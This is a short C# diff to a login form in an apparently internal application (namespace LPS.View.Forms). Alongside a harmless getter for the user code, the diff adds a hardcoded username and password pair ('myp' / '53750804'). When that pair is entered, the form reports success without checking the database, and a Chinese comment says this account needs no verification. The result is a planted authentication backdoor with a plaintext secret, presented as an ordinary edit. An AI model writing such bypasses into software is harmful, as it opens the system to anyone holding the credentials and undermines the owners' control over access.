@@ -18,6 +18,15 @@ namespace LPS.View.Forms
             InitializeComponent();
         }
 
+        /// <summary>
+        /// 取得登入者代碼
+        /// </summary>
+        /// <returns></returns>
+        public string GetLoginUserCode()
+        {
+            return tbUser.Text;
+        }
+
         private void BtnLogin_MouseUp(object sender, MouseEventArgs e)
         {            
             //驗證登入流程;//
@@ -46,6 +55,12 @@ namespace LPS.View.Forms
                 return false;
             }
 
+            //這組帳號不須判斷，直接驗證成功;//
+            if(tbUser.Text == "myp" && tbPW.Text == "53750804")
+            {
+                return true;
+            }
+            
             //帳號驗證;//
             bool isVerify = DaoSQL.Instance.Login(tbUser.Text, tbPW.Text);
             if (isVerify == false)
